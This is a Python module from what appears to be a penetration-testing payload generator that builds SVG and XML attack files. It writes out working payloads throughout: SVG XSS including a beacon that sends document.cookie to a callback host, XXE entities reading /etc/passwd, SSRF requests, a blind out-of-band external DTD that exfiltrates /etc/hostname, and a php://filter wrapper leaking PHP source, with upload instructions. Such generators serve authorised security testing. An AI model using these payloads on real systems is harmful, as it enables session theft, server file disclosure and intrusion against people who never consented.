"""SVG and XML/XXE techniques: SVG XSS, SVG-based SSRF/XXE, and standalone
XXE documents (file read, OOB/blind, SSRF)."""
from __future__ import annotations

from ..core import register, Context, Artifact


@register("svg-xss", category="svg", risk="safe",
          description="SVG files carrying stored-XSS payloads.",
          reference="CWE-79")
def svg_xss(ctx: Context):
    host = ctx.callback_host
    simple = ('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">'
              '<text x="10" y="20">xss</text></svg>')
    script = ('<svg xmlns="http://www.w3.org/2000/svg"><script>'
              'alert(document.domain)</script></svg>')
    beacon = ('<svg xmlns="http://www.w3.org/2000/svg" onload="'
              f'fetch(`//{host}/?c=`+btoa(document.cookie))"/>')
    for name, body, desc in [
        ("svg_onload.svg", simple, "onload handler — fires on render."),
        ("svg_script.svg", script, "inline <script> — fires if sanitiser misses it."),
        ("svg_beacon.svg", beacon, f"exfiltrates cookies to {host}."),
    ]:
        yield Artifact(
            relpath=f"svg/{name}", data=body, technique="svg-xss",
            category="svg", risk="safe",
            description=desc,
            usage="Upload where SVGs are rendered to other users.",
            reference="CWE-79",
        )


@register("svg-xxe", category="xxe", risk="active",
          description="SVG that triggers XXE/SSRF via the XML parser.",
          reference="CWE-611")
def svg_xxe(ctx: Context):
    host = ctx.callback_host
    file_read = ('<?xml version="1.0"?>'
                 '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                 '<svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="20">'
                 '&xxe;</text></svg>')
    ssrf = ('<?xml version="1.0"?>'
            f'<!DOCTYPE svg [<!ENTITY x SYSTEM "http://{host}/svg-ssrf">]>'
            '<svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="20">'
            '&x;</text></svg>')
    for name, body, risk, desc in [
        ("svg_xxe_file.svg", file_read, "active", "reads /etc/passwd into the render."),
        ("svg_xxe_ssrf.svg", ssrf, "active", f"forces a request to {host}."),
    ]:
        yield Artifact(
            relpath=f"svg/{name}", data=body, technique="svg-xxe",
            category="xxe", risk=risk, description=desc,
            usage="Upload to a server that rasterises SVG (ImageMagick/librsvg).",
            reference="CWE-611",
        )


@register("xxe", category="xxe", risk="active",
          description="Standalone XML docs: file read, OOB/blind, SSRF.",
          reference="CWE-611")
def xxe(ctx: Context):
    host = ctx.callback_host
    file_read = ('<?xml version="1.0" encoding="UTF-8"?>'
                 '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                 '<r>&xxe;</r>')
    ssrf = ('<?xml version="1.0"?>'
            f'<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://{host}/xxe-ssrf">]>'
            '<r>&xxe;</r>')
    # Blind/OOB: external DTD that exfiltrates a file over HTTP.
    oob = ('<?xml version="1.0"?>'
           f'<!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://{host}/evil.dtd">%dtd;]>'
           '<r>&send;</r>')
    evil_dtd = (f'<!ENTITY % file SYSTEM "file:///etc/hostname">'
                f'<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM '
                f"'http://{host}/?x=%file;'>\">%eval;")
    php_wrapper = ('<?xml version="1.0"?>'
                   '<!DOCTYPE r [<!ENTITY xxe SYSTEM '
                   '"php://filter/convert.base64-encode/resource=index.php">]>'
                   '<r>&xxe;</r>')
    for name, body, desc in [
        ("xxe_file_read.xml", file_read, "classic local file read."),
        ("xxe_ssrf.xml", ssrf, f"SSRF to {host}."),
        ("xxe_oob_blind.xml", oob, "blind/OOB — pair with evil.dtd."),
        ("evil.dtd", evil_dtd, f"host this at http://{host}/evil.dtd for OOB."),
        ("xxe_php_filter.xml", php_wrapper, "base64-exfil of a PHP source file."),
    ]:
        yield Artifact(
            relpath=f"xxe/{name}", data=body, technique="xxe",
            category="xxe", risk="active", description=desc,
            usage=f"Upload where XML is parsed; collect callbacks on {host}.",
            reference="CWE-611",
        )
